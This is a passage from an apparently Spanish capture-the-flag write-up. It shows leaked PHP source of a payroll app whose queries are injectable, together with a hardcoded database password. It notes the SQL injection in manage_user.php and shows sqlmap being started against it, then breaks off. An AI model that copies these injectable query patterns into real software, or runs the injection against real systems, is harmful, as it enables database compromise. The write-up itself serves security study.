class=\u0026#34;dropdown-item delete_user\u0026#34; href=\u0026#34;javascript:void(0)\u0026#34; data-id = \u0026#39;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026#39;\u0026gt;Delete\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;?php endwhile; ?\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(\u0026#39;#new_user\u0026#39;).click(function(){ uni_modal(\u0026#39;New User\u0026#39;,\u0026#39;manage_user.php\u0026#39;) }) $(\u0026#39;.edit_user\u0026#39;).click(function(){ uni_modal(\u0026#39;Edit User\u0026#39;,\u0026#39;manage_user.php?id=\u0026#39;+$(this).attr(\u0026#39;data-id\u0026#39;)) }) $(\u0026#39;.delete_user\u0026#39;).click(function(){ _conf(\u0026#34;Are you sure to delete this user?\u0026#34;,\u0026#34;delete_user\u0026#34;,[$(this).attr(\u0026#39;data-id\u0026#39;)]) }) function delete_user($id){ start_load() $.ajax({ url:\u0026#39;ajax.php?action=delete_user\u0026#39;, method:\u0026#39;POST\u0026#39;, data:{id:$id}, success:function(resp){ if(resp==1){ alert_toast(\u0026#34;Data successfully deleted\u0026#34;,\u0026#39;success\u0026#39;) setTimeout(function(){ location.reload() },1500) } } }) } \u0026lt;/script\u0026gt; ajax.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 //ajax.php \u0026lt;?php ob_start(); $action = $_GET[\u0026#39;action\u0026#39;]; include \u0026#39;admin_class.php\u0026#39;; $crud = new Action(); if($action == \u0026#39;login\u0026#39;){ $login = $crud-\u0026gt;login(); if($login) echo $login; } if($action == \u0026#39;login2\u0026#39;){ $login = $crud-\u0026gt;login2(); if($login) echo $login; } if($action == \u0026#39;logout\u0026#39;){ $logout = $crud-\u0026gt;logout(); if($logout) echo $logout; } if($action == \u0026#39;logout2\u0026#39;){ $logout = $crud-\u0026gt;logout2(); if($logout) echo $logout; } if($action == \u0026#39;save_user\u0026#39;){ $save = $crud-\u0026gt;save_user(); if($save) echo $save; } if($action == \u0026#39;delete_user\u0026#39;){ $save = $crud-\u0026gt;delete_user(); if($save) echo $save; } if($action == \u0026#39;signup\u0026#39;){ $save = $crud-\u0026gt;signup(); if($save) echo $save; } if($action == \u0026#34;save_settings\u0026#34;){ $save = $crud-\u0026gt;save_settings(); if($save) echo $save; } if($action == \u0026#34;save_employee\u0026#34;){ $save = $crud-\u0026gt;save_employee(); if($save) echo $save; } if($action == \u0026#34;delete_employee\u0026#34;){ $save = $crud-\u0026gt;delete_employee(); if($save) echo $save; } if($action == \u0026#34;save_department\u0026#34;){ $save = $crud-\u0026gt;save_department(); if($save) echo $save; } if($action == \u0026#34;delete_department\u0026#34;){ $save = $crud-\u0026gt;delete_department(); if($save) echo $save; } if($action == \u0026#34;save_position\u0026#34;){ $save = $crud-\u0026gt;save_position(); if($save) echo $save; } if($action == \u0026#34;delete_position\u0026#34;){ $save = $crud-\u0026gt;delete_position(); if($save) echo $save; } if($action == \u0026#34;save_allowances\u0026#34;){ $save = $crud-\u0026gt;save_allowances(); if($save) echo $save; } if($action == \u0026#34;delete_allowances\u0026#34;){ $save = $crud-\u0026gt;delete_allowances(); if($save) echo $save; } if($action == \u0026#34;save_employee_allowance\u0026#34;){ $save = $crud-\u0026gt;save_employee_allowance(); if($save) echo $save; } if($action == \u0026#34;delete_employee_allowance\u0026#34;){ $save = $crud-\u0026gt;delete_employee_allowance(); if($save) echo $save; } if($action == \u0026#34;save_deductions\u0026#34;){ $save = $crud-\u0026gt;save_deductions(); if($save) echo $save; } if($action == \u0026#34;delete_deductions\u0026#34;){ $save = $crud-\u0026gt;delete_deductions(); if($save) echo $save; } if($action == \u0026#34;save_employee_deduction\u0026#34;){ $save = $crud-\u0026gt;save_employee_deduction(); if($save) echo $save; } if($action == \u0026#34;delete_employee_deduction\u0026#34;){ $save = $crud-\u0026gt;delete_employee_deduction(); if($save) echo $save; } if($action == \u0026#34;save_employee_attendance\u0026#34;){ $save = $crud-\u0026gt;save_employee_attendance(); if($save) echo $save; } if($action == \u0026#34;delete_employee_attendance\u0026#34;){ $save = $crud-\u0026gt;delete_employee_attendance(); if($save) echo $save; } if($action == \u0026#34;delete_employee_attendance_single\u0026#34;){ $save = $crud-\u0026gt;delete_employee_attendance_single(); if($save) echo $save; } if($action == \u0026#34;save_payroll\u0026#34;){ $save = $crud-\u0026gt;save_payroll(); if($save) echo $save; } if($action == \u0026#34;delete_payroll\u0026#34;){ $save = $crud-\u0026gt;delete_payroll(); if($save) echo $save; } if($action == \u0026#34;calculate_payroll\u0026#34;){ $save = $crud-\u0026gt;calculate_payroll(); if($save) echo $save; } admin_class.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 //admin_class.php \u0026lt;?php session_start(); ini_set(\u0026#39;display_errors\u0026#39;, 1); Class Action { private $db; public function __construct() { ob_start(); include \u0026#39;db_connect.php\u0026#39;; $this-\u0026gt;db = $conn; } function __destruct() { $this-\u0026gt;db-\u0026gt;close(); ob_end_flush(); } function login(){ extract($_POST); $qry = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM users where username = \u0026#39;\u0026#34;.$username.\u0026#34;\u0026#39; and password = \u0026#39;\u0026#34;.$password.\u0026#34;\u0026#39; \u0026#34;); if($qry-\u0026gt;num_rows \u0026gt; 0){ foreach ($qry-\u0026gt;fetch_array() as $key =\u0026gt; $value) { if($key != \u0026#39;passwors\u0026#39; \u0026amp;\u0026amp; !is_numeric($key)) $_SESSION[\u0026#39;login_\u0026#39;.$key] = $value; } return 1; }else{ return 3; } } function login2(){ extract($_POST); $qry = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM users where username = \u0026#39;\u0026#34;.$email.\u0026#34;\u0026#39; and password = \u0026#39;\u0026#34;.md5($password).\u0026#34;\u0026#39; \u0026#34;); if($qry-\u0026gt;num_rows \u0026gt; 0){ foreach ($qry-\u0026gt;fetch_array() as $key =\u0026gt; $value) { if($key != \u0026#39;passwors\u0026#39; \u0026amp;\u0026amp; !is_numeric($key)) $_SESSION[\u0026#39;login_\u0026#39;.$key] = $value; } return 1; }else{ return 3; } } function logout(){ session_destroy(); foreach ($_SESSION as $key =\u0026gt; $value) { unset($_SESSION[$key]); } header(\u0026#34;location:login.php\u0026#34;); } function logout2(){ session_destroy(); foreach ($_SESSION as $key =\u0026gt; $value) { unset($_SESSION[$key]); } header(\u0026#34;location:../index.php\u0026#34;); } function save_user(){ extract($_POST); $data = \u0026#34; name = \u0026#39;$name\u0026#39; \u0026#34;; $data .= \u0026#34;, username = \u0026#39;$username\u0026#39; \u0026#34;; $data .= \u0026#34;, password = \u0026#39;$password\u0026#39; \u0026#34;; $data .= \u0026#34;, type = \u0026#39;$type\u0026#39; \u0026#34;; if(empty($id)){ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO users set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE users set \u0026#34;.$data.\u0026#34; where id = \u0026#34;.$id); } if($save){ return 1; } } function signup(){ extract($_POST); $data = \u0026#34; name = \u0026#39;$name\u0026#39; \u0026#34;; $data .= \u0026#34;, contact = \u0026#39;$contact\u0026#39; \u0026#34;; $data .= \u0026#34;, address = \u0026#39;$address\u0026#39; \u0026#34;; $data .= \u0026#34;, username = \u0026#39;$email\u0026#39; \u0026#34;; $data .= \u0026#34;, password = \u0026#39;\u0026#34;.md5($password).\u0026#34;\u0026#39; \u0026#34;; $data .= \u0026#34;, type = 3\u0026#34;; $chk = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM users where username = \u0026#39;$email\u0026#39; \u0026#34;)-\u0026gt;num_rows; if($chk \u0026gt; 0){ return 2; exit; } $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO users set \u0026#34;.$data); if($save){ $qry = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM users where username = \u0026#39;\u0026#34;.$email.\u0026#34;\u0026#39; and password = \u0026#39;\u0026#34;.md5($password).\u0026#34;\u0026#39; \u0026#34;); if($qry-\u0026gt;num_rows \u0026gt; 0){ foreach ($qry-\u0026gt;fetch_array() as $key =\u0026gt; $value) { if($key != \u0026#39;passwors\u0026#39; \u0026amp;\u0026amp; !is_numeric($key)) $_SESSION[\u0026#39;login_\u0026#39;.$key] = $value; } } return 1; } } function save_settings(){ extract($_POST); $data = \u0026#34; name = \u0026#39;\u0026#34;.str_replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\u0026amp;#x2019;\u0026#34;,$name).\u0026#34;\u0026#39; \u0026#34;; $data .= \u0026#34;, email = \u0026#39;$email\u0026#39; \u0026#34;; $data .= \u0026#34;, contact = \u0026#39;$contact\u0026#39; \u0026#34;; $data .= \u0026#34;, about_content = \u0026#39;\u0026#34;.htmlentities(str_replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\u0026amp;#x2019;\u0026#34;,$about)).\u0026#34;\u0026#39; \u0026#34;; if($_FILES[\u0026#39;img\u0026#39;][\u0026#39;tmp_name\u0026#39;] != \u0026#39;\u0026#39;){ $fname = strtotime(date(\u0026#39;y-m-d H:i\u0026#39;)).\u0026#39;_\u0026#39;.$_FILES[\u0026#39;img\u0026#39;][\u0026#39;name\u0026#39;]; $move = move_uploaded_file($_FILES[\u0026#39;img\u0026#39;][\u0026#39;tmp_name\u0026#39;],\u0026#39;assets/img/\u0026#39;. $fname); $data .= \u0026#34;, cover_img = \u0026#39;$fname\u0026#39; \u0026#34;; } // echo \u0026#34;INSERT INTO system_settings set \u0026#34;.$data; $chk = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM system_settings\u0026#34;); if($chk-\u0026gt;num_rows \u0026gt; 0){ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE system_settings set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO system_settings set \u0026#34;.$data); } if($save){ $query = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM system_settings limit 1\u0026#34;)-\u0026gt;fetch_array(); foreach ($query as $key =\u0026gt; $value) { if(!is_numeric($key)) $_SESSION[\u0026#39;setting_\u0026#39;.$key] = $value; } return 1; } } function save_employee(){ extract($_POST); $data =\u0026#34; firstname=\u0026#39;$firstname\u0026#39; \u0026#34;; $data .=\u0026#34;, middlename=\u0026#39;$middlename\u0026#39; \u0026#34;; $data .=\u0026#34;, lastname=\u0026#39;$lastname\u0026#39; \u0026#34;; $data .=\u0026#34;, position_id=\u0026#39;$position_id\u0026#39; \u0026#34;; $data .=\u0026#34;, department_id=\u0026#39;$department_id\u0026#39; \u0026#34;; $data .=\u0026#34;, salary=\u0026#39;$salary\u0026#39; \u0026#34;; if(empty($id)){ $i= 1; while($i == 1){ $e_num=date(\u0026#39;Y\u0026#39;) .\u0026#39;-\u0026#39;. mt_rand(1,9999); $chk = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM employee where employee_no = \u0026#39;$e_num\u0026#39; \u0026#34;)-\u0026gt;num_rows; if($chk \u0026lt;= 0){ $i = 0; } } $data .=\u0026#34;, employee_no=\u0026#39;$e_num\u0026#39; \u0026#34;; $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO employee set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE employee set \u0026#34;.$data.\u0026#34; where id=\u0026#34;.$id); } if($save) return 1; } function delete_employee(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM employee where id = \u0026#34;.$id); if($delete) return 1; } function save_department(){ extract($_POST); $data =\u0026#34; name=\u0026#39;$name\u0026#39; \u0026#34;; if(empty($id)){ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO department set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE department set \u0026#34;.$data.\u0026#34; where id=\u0026#34;.$id); } if($save) return 1; } function delete_department(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM department where id = \u0026#34;.$id); if($delete) return 1; } function save_position(){ extract($_POST); $data =\u0026#34; name=\u0026#39;$name\u0026#39; \u0026#34;; $data .=\u0026#34;, department_id = \u0026#39;$department_id\u0026#39; \u0026#34;; if(empty($id)){ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO position set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE position set \u0026#34;.$data.\u0026#34; where id=\u0026#34;.$id); } if($save) return 1; } function delete_position(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM position where id = \u0026#34;.$id); if($delete) return 1; } function save_allowances(){ extract($_POST); $data =\u0026#34; allowance=\u0026#39;$allowance\u0026#39; \u0026#34;; $data .=\u0026#34;, description = \u0026#39;$description\u0026#39; \u0026#34;; if(empty($id)){ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO allowances set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE allowances set \u0026#34;.$data.\u0026#34; where id=\u0026#34;.$id); } if($save) return 1; } function delete_allowances(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM allowances where id = \u0026#34;.$id); if($delete) return 1; } function save_employee_allowance(){ extract($_POST); foreach($allowance_id as $k =\u0026gt;$v){ $data =\u0026#34; employee_id=\u0026#39;$employee_id\u0026#39; \u0026#34;; $data .=\u0026#34;, allowance_id = \u0026#39;$allowance_id[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, type = \u0026#39;$type[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, amount = \u0026#39;$amount[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, effective_date = \u0026#39;$effective_date[$k]\u0026#39; \u0026#34;; $save[] = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO employee_allowances set \u0026#34;.$data); } if(isset($save)) return 1; } function delete_employee_allowance(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM employee_allowances where id = \u0026#34;.$id); if($delete) return 1; } function save_deductions(){ extract($_POST); $data =\u0026#34; deduction=\u0026#39;$deduction\u0026#39; \u0026#34;; $data .=\u0026#34;, description = \u0026#39;$description\u0026#39; \u0026#34;; if(empty($id)){ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO deductions set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE deductions set \u0026#34;.$data.\u0026#34; where id=\u0026#34;.$id); } if($save) return 1; } function delete_deductions(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM deductions where id = \u0026#34;.$id); if($delete) return 1; } function save_employee_deduction(){ extract($_POST); foreach($deduction_id as $k =\u0026gt;$v){ $data =\u0026#34; employee_id=\u0026#39;$employee_id\u0026#39; \u0026#34;; $data .=\u0026#34;, deduction_id = \u0026#39;$deduction_id[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, type = \u0026#39;$type[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, amount = \u0026#39;$amount[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, effective_date = \u0026#39;$effective_date[$k]\u0026#39; \u0026#34;; $save[] = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO employee_deductions set \u0026#34;.$data); } if(isset($save)) return 1; } function delete_employee_deduction(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM employee_deductions where id = \u0026#34;.$id); if($delete) return 1; } function save_employee_attendance(){ extract($_POST); foreach($employee_id as $k =\u0026gt;$v){ $datetime_log[$k] =date(\u0026#34;Y-m-d H:i\u0026#34;,strtotime($datetime_log[$k])); $data =\u0026#34; employee_id=\u0026#39;$employee_id[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, log_type = \u0026#39;$log_type[$k]\u0026#39; \u0026#34;; $data .=\u0026#34;, datetime_log = \u0026#39;$datetime_log[$k]\u0026#39; \u0026#34;; $save[] = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO attendance set \u0026#34;.$data); } if(isset($save)) return 1; } function delete_employee_attendance(){ extract($_POST); $date = explode(\u0026#39;_\u0026#39;,$id); $dt = date(\u0026#34;Y-m-d\u0026#34;,strtotime($date[1])); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM attendance where employee_id = \u0026#39;\u0026#34;.$date[0].\u0026#34;\u0026#39; and date(datetime_log) =\u0026#39;$dt\u0026#39; \u0026#34;); if($delete) return 1; } function delete_employee_attendance_single(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM attendance where id = $id \u0026#34;); if($delete) return 1; } function save_payroll(){ extract($_POST); $data =\u0026#34; date_from=\u0026#39;$date_from\u0026#39; \u0026#34;; $data .=\u0026#34;, date_to = \u0026#39;$date_to\u0026#39; \u0026#34;; $data .=\u0026#34;, type = \u0026#39;$type\u0026#39; \u0026#34;; if(empty($id)){ $i= 1; while($i == 1){ $ref_no=date(\u0026#39;Y\u0026#39;) .\u0026#39;-\u0026#39;. mt_rand(1,9999); $chk = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM payroll where ref_no = \u0026#39;$ref_no\u0026#39; \u0026#34;)-\u0026gt;num_rows; if($chk \u0026lt;= 0){ $i = 0; } } $data .=\u0026#34;, ref_no=\u0026#39;$ref_no\u0026#39; \u0026#34;; $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO payroll set \u0026#34;.$data); }else{ $save = $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE payroll set \u0026#34;.$data.\u0026#34; where id=\u0026#34;.$id); } if($save) return 1; } function delete_payroll(){ extract($_POST); $delete = $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM payroll where id = \u0026#34;.$id); if($delete) return 1; } function calculate_payroll(){ extract($_POST); $am_in = \u0026#34;08:00\u0026#34;; $am_out = \u0026#34;12:00\u0026#34;; $pm_in = \u0026#34;13:00\u0026#34;; $pm_out = \u0026#34;17:00\u0026#34;; $this-\u0026gt;db-\u0026gt;query(\u0026#34;DELETE FROM payroll_items where payroll_id=\u0026#34;.$id); $pay = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM payroll where id = \u0026#34;.$id)-\u0026gt;fetch_array(); $employee = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM employee\u0026#34;); if($pay[\u0026#39;type\u0026#39;] == 1) $dm = 22; else $dm = 11; $calc_days = abs(strtotime($pay[\u0026#39;date_to\u0026#39;].\u0026#34; 23:59:59\u0026#34;)) - strtotime($pay[\u0026#39;date_from\u0026#39;].\u0026#34; 00:00:00 -1 day\u0026#34;) ; $calc_days =floor($calc_days / (60*60*24) ); $att=$this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM attendance where date(datetime_log) between \u0026#39;\u0026#34;.$pay[\u0026#39;date_from\u0026#39;].\u0026#34;\u0026#39; and \u0026#39;\u0026#34;.$pay[\u0026#39;date_from\u0026#39;].\u0026#34;\u0026#39; order by UNIX_TIMESTAMP(datetime_log) asc \u0026#34;) or die(mysqli_error()); while($row=$att-\u0026gt;fetch_array()){ $date = date(\u0026#34;Y-m-d\u0026#34;,strtotime($row[\u0026#39;datetime_log\u0026#39;])); if($row[\u0026#39;log_type\u0026#39;] == 1 || $row[\u0026#39;log_type\u0026#39;] == 3){ if(!isset($attendance[$row[\u0026#39;employee_id\u0026#39;].\u0026#34;_\u0026#34;.$date][\u0026#39;log\u0026#39;][$row[\u0026#39;log_type\u0026#39;]])) $attendance[$row[\u0026#39;employee_id\u0026#39;].\u0026#34;_\u0026#34;.$date][\u0026#39;log\u0026#39;][$row[\u0026#39;log_type\u0026#39;]] = $row[\u0026#39;datetime_log\u0026#39;]; }else{ $attendance[$row[\u0026#39;employee_id\u0026#39;].\u0026#34;_\u0026#34;.$date][\u0026#39;log\u0026#39;][$row[\u0026#39;log_type\u0026#39;]] = $row[\u0026#39;datetime_log\u0026#39;]; } } $deductions = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM employee_deductions where (`type` = \u0026#39;\u0026#34;.$pay[\u0026#39;type\u0026#39;].\u0026#34;\u0026#39; or (date(effective_date) between \u0026#39;\u0026#34;.$pay[\u0026#39;date_from\u0026#39;].\u0026#34;\u0026#39; and \u0026#39;\u0026#34;.$pay[\u0026#39;date_from\u0026#39;].\u0026#34;\u0026#39; ) ) \u0026#34;); $allowances = $this-\u0026gt;db-\u0026gt;query(\u0026#34;SELECT * FROM employee_allowances where (`type` = \u0026#39;\u0026#34;.$pay[\u0026#39;type\u0026#39;].\u0026#34;\u0026#39; or (date(effective_date) between \u0026#39;\u0026#34;.$pay[\u0026#39;date_from\u0026#39;].\u0026#34;\u0026#39; and \u0026#39;\u0026#34;.$pay[\u0026#39;date_from\u0026#39;].\u0026#34;\u0026#39; ) ) \u0026#34;); while($row = $deductions-\u0026gt;fetch_assoc()){ $ded[$row[\u0026#39;employee_id\u0026#39;]][] = array(\u0026#39;did\u0026#39;=\u0026gt;$row[\u0026#39;deduction_id\u0026#39;],\u0026#34;amount\u0026#34;=\u0026gt;$row[\u0026#39;amount\u0026#39;]); } while($row = $allowances-\u0026gt;fetch_assoc()){ $allow[$row[\u0026#39;employee_id\u0026#39;]][] = array(\u0026#39;aid\u0026#39;=\u0026gt;$row[\u0026#39;allowance_id\u0026#39;],\u0026#34;amount\u0026#34;=\u0026gt;$row[\u0026#39;amount\u0026#39;]); } while($row =$employee-\u0026gt;fetch_assoc()){ $salary = $row[\u0026#39;salary\u0026#39;]; $daily = $salary / 22; $min = (($salary / 22) / 8) /60; $absent = 0; $late = 0; $dp = 22 / $pay[\u0026#39;type\u0026#39;]; $present=0; $net=0; $allow_amount=0; $ded_amount=0; for($i = 0; $i \u0026lt; $calc_days;$i++){ $dd = date(\u0026#34;Y-m-d\u0026#34;,strtotime($pay[\u0026#39;date_from\u0026#39;].\u0026#34; +\u0026#34;.$i.\u0026#34; days\u0026#34;)); $count = 0; $p = 0; if(isset($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;])) $count = count($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;]); if(isset($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][1]) \u0026amp;\u0026amp; isset($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][2])){ $att_mn = abs(strtotime($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][2])) - strtotime($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][1]) ; $att_mn =floor($att_mn /60 ); $net += ($att_mn * $min); $late += (240 - $att_mn); $present += .5; } if(isset($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][3]) \u0026amp;\u0026amp; isset($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][4])){ $att_mn = abs(strtotime($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][4])) - strtotime($attendance[$row[\u0026#39;id\u0026#39;].\u0026#34;_\u0026#34;.$dd][\u0026#39;log\u0026#39;][3]) ; $att_mn =floor($att_mn /60 ); $net += ($att_mn * $min); $late += (240 - $att_mn); $present += .5; } } $ded_arr = array(); $all_arr = array(); if(isset($allow[$row[\u0026#39;id\u0026#39;]])){ foreach ($allow[$row[\u0026#39;id\u0026#39;]] as $arow) { $all_arr[] = $arow; $net += $arow[\u0026#39;amount\u0026#39;]; $allow_amount += $arow[\u0026#39;amount\u0026#39;]; } } if(isset($ded[$row[\u0026#39;id\u0026#39;]])){ foreach ($ded[$row[\u0026#39;id\u0026#39;]] as $drow) { $ded_arr[] = $drow; $net -= $drow[\u0026#39;amount\u0026#39;]; $ded_amount +=$drow[\u0026#39;amount\u0026#39;]; } } $absent = $dp - $present; $data = \u0026#34; payroll_id = \u0026#39;\u0026#34;.$pay[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; \u0026#34;; $data .= \u0026#34;, employee_id = \u0026#39;\u0026#34;.$row[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; \u0026#34;; $data .= \u0026#34;, absent = \u0026#39;$absent\u0026#39; \u0026#34;; $data .= \u0026#34;, present = \u0026#39;$present\u0026#39; \u0026#34;; $data .= \u0026#34;, late = \u0026#39;$late\u0026#39; \u0026#34;; $data .= \u0026#34;, salary = \u0026#39;$salary\u0026#39; \u0026#34;; $data .= \u0026#34;, allowance_amount = \u0026#39;$allow_amount\u0026#39; \u0026#34;; $data .= \u0026#34;, deduction_amount = \u0026#39;$ded_amount\u0026#39; \u0026#34;; $data .= \u0026#34;, allowances = \u0026#39;\u0026#34;.json_encode($all_arr).\u0026#34;\u0026#39; \u0026#34;; $data .= \u0026#34;, deductions = \u0026#39;\u0026#34;.json_encode($ded_arr).\u0026#34;\u0026#39; \u0026#34;; $data .= \u0026#34;, net = \u0026#39;$net\u0026#39; \u0026#34;; $save[] = $this-\u0026gt;db-\u0026gt;query(\u0026#34;INSERT INTO payroll_items set \u0026#34;.$data); } if(isset($save)){ $this-\u0026gt;db-\u0026gt;query(\u0026#34;UPDATE payroll set status = 1 where id = \u0026#34;.$pay[\u0026#39;id\u0026#39;]); return 1; } } } db_connect.php\r1 2 3 4 //db_connect \u0026lt;?php $conn= new mysqli(\u0026#39;localhost\u0026#39;,\u0026#39;remo\u0026#39;,\u0026#39;TrulyImpossiblePasswordLmao123\u0026#39;,\u0026#39;payroll_db\u0026#39;)or die(\u0026#34;Could not connect to mysql\u0026#34;.mysqli_error($con)); También logramos observar el codigo de manage_user.php donde vemos que realiza un query segun el id que se le pase sin ningun tipo de filtro, por lo que podríamos existir alguna vulnerabilidad sqli.\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php include(\u0026#39;db_connect.php\u0026#39;); if(isset($_GET[\u0026#39;id\u0026#39;])){ $user = $conn-\u0026gt;query(\u0026#34;SELECT * FROM users where id =\u0026#34;.$_GET[\u0026#39;id\u0026#39;]); foreach($user-\u0026gt;fetch_array() as $k =\u0026gt;$v){ $meta[$k] = $v; } } ?\u0026gt; // [.. snip ..] Payroll - SQLi Ejecutamos sqlmap, observamos que el parametro id es inyectable y observamos dos bases de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 